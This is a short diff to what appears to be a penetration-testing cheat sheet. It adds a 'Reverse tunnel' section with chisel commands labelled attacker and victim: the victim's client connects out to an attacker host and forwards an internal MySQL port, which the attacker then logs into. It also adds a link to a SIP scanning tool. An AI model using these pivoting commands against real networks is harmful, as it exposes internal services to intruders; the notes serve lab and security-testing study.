@@ -75,6 +75,18 @@ Expose port 22 on 8888 (if 22 is only open to localhost for example)
 socat -d -d TCP-LISTEN:8888,reuseaddr,fork TCP:localhost:22
 ```
 
+Reverse tunnel :&#x20;
+
+```bash
+./chisel server -p 12312 --reverse # attacker
+./chisel client 10.10.14.4:12312 R:3306:172.17.0.4:3306 #victim
+mysql -uUSER -pPASSWORD -h 127.0.0.1 #attacker
+```
+
+#### SIP / VoIP
+
+[https://www.kali.org/tools/sipvicious/](https://www.kali.org/tools/sipvicious/)
+
 ## File transfer
 
 Sending a file through netcat
